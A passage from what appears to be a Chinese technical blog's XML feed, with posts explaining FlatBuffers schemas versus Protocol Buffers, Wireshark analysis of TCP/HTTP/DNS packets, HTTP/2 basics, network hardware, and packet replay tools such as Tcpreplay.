发送，并且无需进一步处理即可读取。相比较而言，在传输 JSON 时，我们需要将数据转换为字符串，通过 wire 发送，解析字符串，并将其转换为本地对象。Flatbuffers 不需要这些操作。你用二进制装入数据，发送相同的二进制文件，并直接从二进制文件读取。</p><p>尽管 FlatBuffers 有自己的接口定义语言来定义要与之序列化的数据，但它也支持 Protocol Buffers 中的 .proto格式。</p><p>在 schema 中定义对象类型，然后可以将它们编译为 C++ 或 Java 等各种主流语言，以实现零开销读写。FlatBuffers 还支持将 JSON 数据动态地分析到 buffer 中。</p><p>除了解析效率以外，二进制格式还带来了另一个优势，数据的二进制表示通常更具有效率。我们可以使用 4 字节的 UInt 而不是 10 个字符来存储 10 位数字的整数。</p><p>FlatBuffers 与 Protocol Buffers 确实比较相似，主要的区别在于 FlatBuffers 在访问数据之前不需要解析/解包。两者代码也是一个数量级的。但是 Protocol Buffers 既没有可选的文本导入/导出功能，也没有 union 这个语言特性，这两点 FlatBuffers 都有。</p><p>FlatBuffers 专注于移动硬件（内存大小和内存带宽比桌面端硬件更受限制），以及具有最高性能需求的应用程序：游戏。</p><h2 id="支持设备"><a href="#支持设备" class="headerlink" title="支持设备"></a>支持设备</h2><p>Windows、mmacOS、Linux、Android等</p><h2 id="支持语言"><a href="#支持语言" class="headerlink" title="支持语言"></a>支持语言</h2><p>Python、Java、c++等</p><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><h3 id="编写想要序列化的数据结构的schema（IDL-接口定义）文件"><a href="#编写想要序列化的数据结构的schema（IDL-接口定义）文件" class="headerlink" title="编写想要序列化的数据结构的schema（IDL,接口定义）文件"></a>编写想要序列化的数据结构的schema（IDL,接口定义）文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// example IDL file</span><br><span class="line"></span><br><span class="line">namespace MyGame;</span><br><span class="line"></span><br><span class="line">attribute &quot;priority&quot;;</span><br><span class="line"></span><br><span class="line">enum Color : byte &#123; Red = 1, Green, Blue &#125;</span><br><span class="line"></span><br><span class="line">union Any &#123; Monster, Weapon, Pickup &#125;</span><br><span class="line"></span><br><span class="line">struct Vec3 &#123;</span><br><span class="line">  x:float;</span><br><span class="line">  y:float;</span><br><span class="line">  z:float;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">table Monster &#123;</span><br><span class="line">  pos:Vec3;</span><br><span class="line">  mana:short = 150;</span><br><span class="line">  hp:short = 100;</span><br><span class="line">  name:string;</span><br><span class="line">  friendly:bool = false (deprecated, priority: 1);</span><br><span class="line">  inventory:[ubyte];</span><br><span class="line">  color:Color = Blue;</span><br><span class="line">  test:Any;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">root_type Monster;</span><br></pre></td></tr></table></figure><p>在上述的schema文件中有两个重要的概念，struct和table。</p><h4 id="table"><a href="#table" class="headerlink" title="table"></a>table</h4><p>Table 是在 FlatBuffers 中定义对象的主要方式，由一个名称（这里是 Monster）和一个字段列表组成。每个字段都有一个名称，一个类型和一个可选的默认值（如果省略，它默认为 0 / NULL）。</p><p>Table 中每个字段都是可选 optional 的：它不必出现在 wire 表示中，并且可以选择省略每个单独对象的字段。这种设计也是 FlatBuffer 的前向和后向兼容机制。</p><p>假设当前schema是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:int; b:int; &#125;</span><br></pre></td></tr></table></figure></p><h5 id="添加字段"><a href="#添加字段" class="headerlink" title="添加字段"></a>添加字段</h5><p>只能在表定义的末尾添加新的字段。旧数据仍会正确读取，并在读取时为您提供默认值。旧代码将简单地忽略新字段。如果希望灵活地使用 schema 中字段的任何顺序，您可以手动分配ids。<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:int; b:int; c:int; &#125;</span><br><span class="line">或者</span><br><span class="line">table &#123; c:int (id: 2); a:int (id: 0); b:int (id: 1); &#125;</span><br></pre></td></tr></table></figure></p><h5 id="删除字段"><a href="#删除字段" class="headerlink" title="删除字段"></a>删除字段</h5><p>不能从 schema 中删除不再使用的字段，但可以简单地停止将它们写入数据中。此外，可以将它们标记为 deprecated，如上例所示，被标记的字段不会再生成 C ++ 的访问器，从而强制该字段不再被使用。</p><h5 id="更改字段"><a href="#更改字段" class="headerlink" title="更改字段"></a>更改字段</h5><p>可以更改字段名称和 table 名称。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:uint; b:uint; &#125;</span><br></pre></td></tr></table></figure></p><p>直接修改字段的类型，这样做可能可行，也有情况不行。只有在类型改变是相同大小的情况下，是可行的。如果旧数据不包含任何负数，这将是安全的，如果包含了负数，这样改变会出现问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:int = 1; b:int = 2; &#125;</span><br></pre></td></tr></table></figure></p><p>这样修改不可行。任何写入数值为 0 的旧数据都不会再写入 buffer，并依赖于重新创建的默认值。现在这些值将显示为1和2。有些情况下可能不会出错，但必须小心。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; aa:int; bb:int; &#125;</span><br></pre></td></tr></table></figure></p><p>上面这种修改方法，修改原来的变量名以后，可能会出现问题。由于已经重命名了字段，这将破坏所有使用此版本 schema 的代码（和 JSON 文件），这与实际的二进制缓冲区不兼容。</p><p>table 是 FlatBuffers 的基石，因为对于大多数需要序列化应用来说，数据结构改变是必不可少的。通常情况下，处理数据结构的变更在大多数序列化解决方案的解析过程中可以透明地完成的。但是一个 FlatBuffer 在被访问之前不会被分析。</p><p>为了解决数据结构变更的问题，table 通过 vtable 间接访问字段。每个 table 都带有一个 vtable（可以在具有相同布局的多个 table 之间共享），并且包含存储此特定类型 vtable 实例的字段的信息。vtable 还可能表明该字段不存在（因为此 FlatBuffer 是使用旧版本的软件编写的，仅仅因为信息对于此实例不是必需的，或者被视为已弃用），在这种情况下会返回默认值。</p><p>table 的内存开销很小（因为 vtables 很小并且共享）访问成本也很小（间接访问），但是提供了很大的灵活性。table 甚至可能比等价的 struct 花费更少的内存，因为字段在等于默认值时不需要存储在 buffer 中。</p><h4 id="structs"><a href="#structs" class="headerlink" title="structs"></a>structs</h4><p>tructs 和 table 非常相似，只是 structs 没有任何字段是可选的（所以也没有默认值），字段可能不会被添加或被弃用。结构可能只包含标量或其他结构。如果确定以后不会进行任何更改。structs 使用的内存少于 table，并且访问速度更快（它们总是以串联方式存储在其父对象中，并且不使用虚拟表）。  </p><p>structs 不提供前向/后向兼容性，但占用内存更小。对于不太可能改变的非常小的对象（例如坐标对或RGBA颜色）存成 struct 是非常有用的。</p><h4 id="Types"><a href="#Types" class="headerlink" title="Types"></a>Types</h4><p>FlatBuffers 支持的 标量 类型有以下几种：</p><ul><li>8 bit: byte (int8), ubyte (uint8), bool</li><li>16 bit: short (int16), ushort (uint16)</li><li>32 bit: int (int32), uint (uint32), float (float32)</li><li>64 bit: long (int64), ulong (uint64), double (float64)</li></ul><p>括号里面的名字对应的是类型的别名。</p><p>FlatBuffers 支持的 非标量 类型有以下几种：</p><ul><li>任何类型的数组。不过不支持嵌套数组，可以用 table 内定义数组的方式来取代嵌套数组。</li><li>UTF-8 和 7-bit ASCII 的字符串。其他格式的编码字符串或者二进制数据，需要用 [byte] 或者 [ubyte] 来替代。</li><li>table、structs、enums、unions</li></ul><p>标量类型的字段有默认值，非标量的字段(string/vector/table)如果没有值的话，默认值为 NULL。</p><p>一旦一个类型声明了，尽量不要改变它的类型，一旦改变了，很可能就会出现错误。上面也提到过了，如果把 int 改成 uint，数据如果有负数，那么就会出错。</p><h4 id="Enums"><a href="#Enums" class="headerlink" title="Enums"></a>Enums</h4><p>定义一系列命名常量，每个命名常量可以分别给一个定值，也可以默认的从前一个值增加一。默认的第一个值是 0。正如在上面例子中看到的枚举声明，使用:(上面例子中是 byte 字节）指定枚举的基本整型，然后确定用这个枚举类型声明的每个字段的类型。</p><p>通常，只应添加枚举值，不要去删除枚举值（对枚举不存在弃用一说）。这需要开发者代码通过处理未知的枚举值来自行处理向前兼容性的问题</p><h4 id="Unions"><a href="#Unions" class="headerlink" title="Unions"></a>Unions</h4><p>这个是 Protocol buffers 中还不支持的类型。</p><p>union 是 C 语言中的概念，一个 union 中可以放置多种类型，共同使用一个内存区域。</p><p>但是在 FlatBuffers 中，Unions 可以像 Enums 一样共享许多属性，但不是常量的新名称，而是使用 table 的名称。可以声明一个 Unions 字段，该字段可以包含对这些类型中的任何一个的引用，即这块内存区域只能由其中一种类型使用。另外还会生成一个带有后缀 _type 的隐藏字段，该字段包含相应的枚举值，从而可以在运行时知道要将哪些类型转换为类型。</p><p>union 跟 enum 比较类似，但是 union 包含的是 table，enum 包含的是 scalar或者 struct。</p><p>Unions 是一种能够在一个 FlatBuffer 中发送多种消息类型的好方法。请注意，因为union 字段实际上是两个字段(有一个隐藏字段)，所以它必须始终是表的一部分，它本身不能作为 FlatBuffer 的 root。</p><h3 id="使用flatc编译"><a href="#使用flatc编译" class="headerlink" title="使用flatc编译"></a>使用flatc编译</h3><p>使用FlatBuffer编译器flatc生成数据结构源代码（C++头文件或者Java类）</p><h3 id="使用相关接口读取或写入flat-buffer"><a href="#使用相关接口读取或写入flat-buffer" class="headerlink" title="使用相关接口读取或写入flat buffer"></a>使用相关接口读取或写入flat buffer</h3><p><a href="https://github.com/google/flatbuffers/blob/master/tests/JavaTest.java" target="_blank" rel="noopener">https://github.com/google/flatbuffers/blob/master/tests/JavaTest.java</a></p><h1 id="Protocol-Buffer-与-Flat-Buffer"><a href="#Protocol-Buffer-与-Flat-Buffer" class="headerlink" title="Protocol Buffer 与 Flat Buffer"></a>Protocol Buffer 与 Flat Buffer</h1><ul><li>弃用的字段，不用手动分配字段的 ID。在 .proto 中扩展一个对象，需要在数字中寻找一个空闲的空位（因为 protocol buffers 有更紧凑的表示方式，所以必须选择更小的数字）。除了这点不方便之外，它还使得删除字段成为问题：如果保留它们，从语意表达上不是很明显的表达出这个字段不能读写了，保留它们，还会生成访问器。如果删除它们，就会有出现严重 bug 的风险，因为当有人重用了这些 ID，会导致读取到旧的数据，这样数据会发生错乱。</li><li>FlatBuffers 区分 table 和 struct。所有 table 字段都是可选的，并且所有 struct 字段都是必需的。</li><li>FlatBuffers 具有原生数组类型而不是 repeated。这给你一个长度，而不必收集所有项目，并且在标量的情况下提供更紧凑的表示，并且确保相邻性。</li><li>FlatBuffers 具有 union 类型，这个也是 protocol buffers 没有的。一个 union 可以替代很多个 optional 字段，这样也可以节约每个字段都要一一检查的时间。</li><li>FlatBuffers 能够为所有标量定义默认值，而不必在每次访问时处理它们的 optional，并且默认值不存在 buffer 中，也不用担心空间的问题。</li><li>可以统一处理模式和数据定义（并且和 JSON 兼容）的解析器。protocol buffers 不兼容 JSON。FlatBuffers 的 flatc 编译器可带的参数也更加强大，具体可带参数列表见此文档</li><li>schema 扩展了一些 protocol buffers 没有的 Attributes</li></ul><p>除去功能上的不同，再就是一些 schema 语法上的细微不同：</p><ul><li>定义对象，protocol buffers 是 message，FlatBuffers 是 table</li><li>ID，protocol buffers 默认是从 1 开始标号，FlatBuffers 默认从 0 开始</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据包分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Protocol BUffer </tag>
            
            <tag> Flat Buffer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wireshark数据包分析</title>
      <link href="/2019/01/07/wireshark%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/"/>
      <url>/2019/01/07/wireshark%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="TCP报文"><a href="#TCP报文" class="headerlink" title="TCP报文"></a>TCP报文</h2><p>TCP：（TCP是面向连接的通信协议，通过三次握手建立连接，通讯完成时要拆除连接，由于TCP 是面向连接的所以只能用于点对点的通讯）源IP地址：发送包的IP地址；目的IP地址：接收包的IP地址；源端口：源系统上的连接的端口；目的端口：目的系统上的连接的端口。  TCP是因特网中的传输层协议，使用三次握手协议建立连接。当主动方发出SYN连接请求后，等待对方回答SYN，ACK。这种建立连接的方法可以防止产生错误的连接，TCP使用的流量控制协议是可变大小的滑动窗口协议。第一次握手：建立连接时，客户端发送SYN包(SEQ=x)到服务器，并进入SYN_SEND状态，等待服务器确认。第二次握手：服务器收到SYN包，必须确认客户的SYN(ACK=x+1),同时自己也送一个SYN包(SEQ=y),即SYN+ACK包，此时服务器进入SYN_RECV状态。第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ACK=y+1),此包发送完毕，客户端和服务器进入Established状态，完成三次握手</p><h3 id="封包详细信息"><a href="#封包详细信息" class="headerlink" title="封包详细信息"></a>封包详细信息</h3><p><img src="https://img-blog.csdn.net/20170114092218164" alt="image"><br>A. 第一行，帧Frame 36838 指的是要发送的数据块，其中，所抓帧的序号为36838，捕获字节数等于传送字节数：70字节；</p><p>B. 第二行，以太网，有线局域网技术，是数据链路层。源Mac地址为88:5d:90:00:00:25；目标Mac地址为00:25:22:b5:b9:92；</p><p>C. 第三行，IPV4协议，也称网际协议，是网络层；源IP地址为192.168.21.175；目标IP地址为192.168.21.156；</p><p>D. 第四行，TCP协议，也称传输控制协议，是传输层；源端口(10086)；目标端口(50132)；序列号(1361)；ACK是TCP数据包首部中的确认标志，对已接收到的TCP报文进行确认，值为1表示确认号有效；长度为16；</p><p>E. 第五行，数据共有16字节</p><h4 id="Frame信息分析"><a href="#Frame信息分析" class="headerlink" title="Frame信息分析"></a>Frame信息分析</h4><p><img src="https://img-blog.csdn.net/20170114104835215" alt="image"><br>A. Arrival Time：到达时间，值为Jan 14, 2017 08:52:56.239204000</p><p>B. EPoch Time：信息出现时间，值为1484355176.239204000秒</p><p>C. [ Time delta from previous captured frame: 0.001472000 seconds] ：与之前捕获的数据帧时间差：0.001472000秒；</p><pre><code>[Time delta from previous displayed frame: 0.001472000 seconds]：与之前显示的帧时间差： 0.001472000秒；[Time since reference or first frame: 1278.276505000 seconds]：距参考帧或第一帧的时间差：1278.276505000秒；</code></pre><p>D. Frame Number: 36838，帧编号为36838；</p><p>E. Frame Length: 70 bytes (560 bits)，帧长度为70字节；</p><pre><code>Capture Length: 70 bytes (560 bits)，捕获到的长度为70字节；</code></pre><p>F. [Frame is marked: False]，帧标记：无；</p><pre><code>[Frame is ignored: False]，帧被忽略：无；</code></pre><p>G. [Protocols in frame: eth:ip:tcp:data]，协议帧：eth(以太网)、IP、tcp、data</p><p>H. [Coloring Rule Name: TCP]，色彩规则名称：TCP；</p><pre><code>[Coloring Rule String: tcp]，色彩规则字符串：TCP；</code></pre><h4 id="Ethernet-II信息分析"><a href="#Ethernet-II信息分析" class="headerlink" title="Ethernet II信息分析"></a>Ethernet II信息分析</h4><p><img src="https://img-blog.csdn.net/20170114111317125" alt="iamge"><br>A. Destination: AsrockIn_b5:b9:92 (00:25:22:b5:b9:92)，目标Mac地址为00:25:22:b5:b9:92</p><p>B. Source: 88:5d:90:00:00:25 (88:5d:90:00:00:25)，源Mac地址为88:5d:90:00:00:25</p><p>C. Type: IP (0x0800)，类型是IP数据包</p><h4 id="Ipv4协议信息分析"><a href="#Ipv4协议信息分析" class="headerlink" title="Ipv4协议信息分析"></a>Ipv4协议信息分析</h4><p><img src="https://img-blog.csdn.net/20170114112410438" alt="image"></p><p>A. Version: 4，IP协议版本为IPv4；</p><pre><code>Header length: 20 bytes，头部数据长度为20字节；</code></pre><p>B. Differentiated Services Field: 0x00 (DSCP 0x00: Default; ECN: 0x00: Not-ECT (Not ECN-Capable Transport))，区分的服务领域：0x00 (默认的是DSCP：0x00)；</p><p>C. Flags: 0x02 (Don’t Fragment)，不支持分组；</p><pre><code>Fragment offset: 0，分组偏移量为0； </code></pre><p>D. Time to live: 64，TTL，生存时间为64，TTL通常表示包在被丢弃前最多能经过的路由器个数，当数据包传输到一个路由器之后，TTL就自动减1，如果减到0了还没有传送到目标主机，那么就自动丢失。</p><p>E. Header checksum: 0xcebd [correct]，头部校验和</p><p>F. Source: 192.168.21.175 (192.168.21.175)，源IP地址为192.168.21.175；</p><pre><code>Destination: 192.168.21.156 (192.168.21.156)，目标IP地址为192.168.21.156</code></pre><h4 id="Trasmission-Control-Protocol信息分析"><a href="#Trasmission-Control-Protocol信息分析" class="headerlink" title="Trasmission Control Protocol信息分析"></a>Trasmission Control Protocol信息分析</h4><p>其中，对应的TCP首部的数据信息<br><img src="https://img-blog.csdn.net/20170114093029919" alt="image"></p><p>A. 端口号，数据传输的16位源端口号和16位目标端口号(用于寻找发端和收端应用进程)；</p><p>B. 相对序列号，该数据包的相对序列号为1361(此序列号用来确定传送数据的正确位置，且序列号用来侦测丢失的包)；下一个数据包的序列号是1377；</p><p>C. Acknowledgment number是32位确认序列号，值等于1表示数据包收到，确认有效；</p><p>D. 手动的数据包的头字节长度是20字节；</p><p>E. Flags，含6种标志；ACK：确认序号有效；SYN：同步序号用来发起一个连接；FIN：发端完成发送任务；RST：重新连接；PSH：接收方应该尽快将这个报文段交给应用层；URG：紧急指针(urgentpointer)有效；</p><p>F. window，TCP的流量控制由连接的每一端通过声明的窗口大小来提供。窗口大小为字节数，起始于确认序号字段指明的值，这个值是接收端正期望接收的字节。窗口大小是一个16bit字段，因而窗口大小最大为65536字节，上面显示窗口大小为1825字节；</p><p>G. Checksum，16位校验和，检验和覆盖了整个的TCP报文段，由发端计算和存储，并由收端进行验证</p><h4 id="Data信息分析"><a href="#Data信息分析" class="headerlink" title="Data信息分析"></a>Data信息分析</h4><p><img src="https://img-blog.csdn.net/20170114114030332" alt="image"></p><p>A.  TCP 报文段中的数据(该部分是可选的)，长度为16字节；</p><h2 id="Http报文"><a href="#Http报文" class="headerlink" title="Http报文"></a>Http报文</h2><p>链路层的信息上是以帧的形式进行传输的，帧封装了应用层、传输层、网络层的数据。而Wireshark抓到的就是链路层的一帧；</p><h3 id="封装包详细信息"><a href="#封装包详细信息" class="headerlink" title="封装包详细信息"></a>封装包详细信息</h3><p><img src="https://img-blog.csdn.net/20170114120559104" alt="image"></p><p>A. 第一行，帧Frame 12411 指的是要发送的数据块，其中，所抓帧的序号为12411，捕获字节数等于传送字节数：233字节；</p><p>B. 第二行，以太网，有线局域网技术，是数据链路层。源Mac地址为24:69:68:6b:78:96；目标Mac地址为00:25:22:b5:b9:92；</p><p>C. 第三行，IPV4协议，也称网际协议，是网络层；源IP地址为220.181.57.234；目标IP地址为192.168.21.156；</p><p>D. 第四行，TCP协议，也称传输控制协议，是传输层；源端口(80)；目标端口(53985)；序列号(1)；ACK是TCP数据包首部中的确认标志，对已接收到的TCP报文进行确认，值为1表示确认号有效；长度为179；</p><p>E. 第五行，Http协议，也称超文本传输协议，是应用层</p><h4 id="Http请求报文分析"><a href="#Http请求报文分析" class="headerlink" title="Http请求报文分析"></a>Http请求报文分析</h4><p><img src="https://img-blog.csdn.net/20170114135028036" alt="image"></p><p>报文分析：<br><img src="https://img-blog.csdn.net/20170114135154140" alt="image"></p><p>在抓包分析过程中还发现了另外一些http请求报文中所特有的首部字段名，比如下面http请求报文中橙黄色首部字段名：</p><p><img src="https://img-blog.csdn.net/20170114135419581" alt="image"></p><h4 id="Http响应报文信息"><a href="#Http响应报文信息" class="headerlink" title="Http响应报文信息"></a>Http响应报文信息</h4><p><img src="https://img-blog.csdn.net/20170114134516128" alt="image"></p><p>报文分析：  </p><p><img src="https://img-blog.csdn.net/20170114134622379" alt="image"></p><h2 id="DNS报文"><a href="#DNS报文" class="headerlink" title="DNS报文"></a>DNS报文</h2><h3 id="封包详细信息-1"><a href="#封包详细信息-1" class="headerlink" title="封包详细信息"></a>封包详细信息</h3><p><img src="https://img-blog.csdn.net/20170114140200794" alt="image"></p><p>A. 第一行，帧Frame 12237 指的是要发送的数据块，其中，所抓帧的序号为12237，捕获字节数等于传送字节数：133字节；</p><p>B. 第二行，以太网，有线局域网技术，是数据链路层。源Mac地址为24:69:68:6b:78:96；目标Mac地址为00:25:22:b5:b9:92；</p><p>C. 第三行，IPV4协议，也称网际协议，是网络层；源IP地址为192.168.211.254；目标IP地址为192.168.211.84；</p><p>D. 第四行，UDP协议，是传输层；源端口domain(53)；目标端口(65219)；</p><p>E. 第五行，DNS协议，是应用层。</p><h4 id="DNS查询报文"><a href="#DNS查询报文" class="headerlink" title="DNS查询报文"></a>DNS查询报文</h4><p><img src="https://img-blog.csdn.net/20170114141159062" alt="iamge"></p><p>报文分析：<br><img src="https://img-blog.csdn.net/20170114141447421" alt="image"></p><h4 id="DNS响应报文"><a href="#DNS响应报文" class="headerlink" title="DNS响应报文"></a>DNS响应报文</h4><p><img src="https://img-blog.csdn.net/20170114141637002" alt="iamge"></p><p>报文分析：  </p><p><img src="https://img-blog.csdn.net/20170114142315693" alt="image"></p><h2 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h2><p><img src="https://img-blog.csdn.net/20170118162817190" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 数据包分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wireshark </tag>
            
            <tag> 数据包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http2协议、数据包回放</title>
      <link href="/2019/01/07/http-http2%E5%8D%8F%E8%AE%AE/"/>
      <url>/2019/01/07/http-http2%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="http2协议"><a href="#http2协议" class="headerlink" title="http2协议"></a>http2协议</h2><p>http2协议是一个二进制协议。采用二进制格式协议传输数据，而不是http/1.x的文本格式。</p><p>http/2源于SPDY，但仍有不同的地方，主要是以下两点：</p><ul><li>HTTP/2 支持明文 HTTP 传输，而 SPDY 强制使用 HTTPS</li><li>HTTP/2 消息头的压缩算法采用 HPACK，而非 SPDY 采用的 DELEFT</li></ul><p>注：spdy是Google开发的基于TCP的应用层协议，用以最小化网络延迟，提升网络速度，优化用户的网络使用体验。SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。新协议的功能包括数据流的多路复用、请求优先级以及HTTP报头压缩。互联网工程任务组（IETF）对谷歌提出的SPDY协议进行了标准化，于2015年5推出了类似于SPDY协议的 HTTP 2.0 协议标准（简称HTTP/2）。谷歌因此宣布放弃对SPDY协议的支持，转而支持HTTP/2。此外，著名的开源HTTP服务器软件 Nginx 也于2015年9月移除了对SPDY的支持，转而支持HTTP/2。</p><h2 id="二进制格式"><a href="#二进制格式" class="headerlink" title="二进制格式"></a>二进制格式</h2><p>HTTP/1 的请求和响应报文，都是由起始行、首部和实体正文（可选）组成，各部分之间以文本换行符分隔。<br>HTTP/2 将请求和响应数据分割为更小的帧，并对它们采用二进制编码。<br>帧（Frame）：HTTP/2 数据通信的最小单位。<br>消息（Message）：指 HTTP/2 中逻辑上的 HTTP 消息。例如请求和响应等，消息由一个或多个帧组成<br>流（Stream）：存在于连接中的一个虚拟通道。流可以承载双向消息，每个流都有一个唯一的整数 ID。</p><p>HTTP/2 中，同域名下所有通信都在单个连接上完成，这个连接可以承载任意数量的双向数据流。每个数据流都以消息的形式发送，而消息又由一个或多个帧组成。多个帧之间可以乱序发送，因为根据帧首部的流标识可以重新组装。</p><p>Frame 是 HTTP/2 二进制格式的基础，Frame 的基本格式如下</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB838ae8fda562512d2d95b9d69dd73b1a?method=download&amp;shareKey=19abcf09a1c0f9e2d3f35b8ab0fc884f" alt="image"></p><h2 id="http2的影响"><a href="#http2的影响" class="headerlink" title="http2的影响"></a>http2的影响</h2><p>现在http2还没被大范围部署使用，我们也无法确定到底会发生什么变化，但至少可以参考SPDY的例子和曾经做过的实验来进行大概估计。</p><p>http2减少了网络往返传输的数量，并且用多路复用和快速丢弃不需要的流的办法来完全避免了head of line blocking的困扰。</p><p>它也支持大量并行流，所以即使网站的数据分发在各处也不是问题。</p><p>合理利用流的优先级，可以让客户端尽可能优先收到更重要的数据。</p><p>所有这些加起来，我认为页面载入时间和站点相应的速度都会更快。简而言之：更好的web体验。</p><p>但到底能变得多快，到底提升有多大呢？我认为目前很难说清楚。毕竟这些技术依然在早期，我们还没法看见客户端和服务器实现这些并真正受益于新协议所提供的强大功能。</p><h2 id="集线器、交换机、路由器"><a href="#集线器、交换机、路由器" class="headerlink" title="集线器、交换机、路由器"></a>集线器、交换机、路由器</h2><h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><p>集线器(Hub)工作在最底层(物理层)，没有相匹配的软件系统，是纯硬件设备,集线器主要用来连接计算机等网络终端。</p><p>集线器为<strong>共享式带宽</strong>，连接在集线器上的任何一个设备发送数据时，其他所有设备必须等待，此设备享有全部带宽，通讯完毕，再由其他设备使用带宽。正因此，集线器连接了一个冲突域的网络。所有设备相互交替使用，就好象大家一起过一根独木桥一样。</p><p>集线器<strong>不能判断数据包的目的地和类型</strong>，所以如果是广播数据包也依然转发，而且所有设备发出数据以广播方式发送到每个接口，这样集线器也连接了一个广播域的网络。</p><h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><p>交换机工作在数据链接层(第二层)，和集线器一样主要用于连接计算机等网络终端设备。允许连接在交换机上的设备并行通讯，好比高速公路上的汽车并行行使一般，设备间通讯不会再发生冲突，因此交换机打破了冲突域，交换机每个接口是一个冲突域，不会与其他接口发生通讯冲突。</p><p>有系统的交换机可以记录MAC地址表，发送的数据不会再以广播方式发送到每个接口，而是直接到达目的接口，节省了接口带宽。但是交换机和集线器一样不能判断广播数据包，会把广播发送到全部接口，所以交换机和集线器一样连接了一个广播域网络。</p><p>高端一点的交换机不仅可以记录MAC地址表，还可以划分VLAN（虚拟局域网）来隔离广播，但是VLAN间也同样不能通讯。要使VLAN间能够通讯，必须有三层设备介入。</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>路由器工作在网络层(第三层)，主要用来进行网络与网络的连接，所有路由器都有自己的操作系统。路由器把数据从一个网络发送到另一个网络，这个过程就叫路由。路由器不仅能像交换机一样隔离冲突域，而且还能检测广播数据包，并丢弃广播包来隔离广播域，有效的扩大了网络的规模。</p><p>在路由器中记录着路由表，路由器以此来转发数据，以实现网络间的通讯。路由器的介入可以使交换机划分的VLAN实现互相通讯。</p><h2 id="数据包回放"><a href="#数据包回放" class="headerlink" title="数据包回放"></a>数据包回放</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><table><thead><tr><th>name</th><th>complete connection</th><th>stateful</th><th>selected replay</th></tr></thead><tbody><tr><td></td></tr></tbody></table><p>TCPReplay|No Required|No|No<br>Tomahawk|Required|Yes|No<br>Mokey|No Required|Yes|No<br>Avalanche|Required|Yes|No<br>SocketReplay|No Required|Yes|Yes</p><h3 id="TcpReplay"><a href="#TcpReplay" class="headerlink" title="TcpReplay"></a>TcpReplay</h3><p>Tcpreplay是一个工具套件，用来测试各种网络设备，包括：交换机、路由器、防火墙、NIDS和IPS等。它使用嗅探工具抓取的数据包，允许你拆分客户端和服务端流量，重写2、3、4层头信息，最终将流量回放到网络中。3.4 版本包括以下部分：</p><ul><li><p>Tcpprep:将流量拆分为客户端和服务端两个方向，并存放为缓存文件</p></li><li><p>Tcprewrite:重写pcap文件的TCP/IP层和数据链路层的头信息</p></li><li><p>Tcpreplay:以可控的速度将pcap文件回放到网络中</p></li><li><p>Tcpreplay-edit:在tcpreplay基础上增加编辑功能</p></li><li><p>Tcpbirdge:桥接两个不同网段</p></li><li><p>Tcpcapinfo:pcap 文件解码器和编译器</p></li></ul><p>原文链接：<a href="https://www.cnblogs.com/jiayy/p/3447027.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiayy/p/3447027.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据包分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> http2 </tag>
            
            <tag> 数据包回放 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据包分析基础</title>
      <link href="/2019/01/07/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/01/07/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/</url>
      
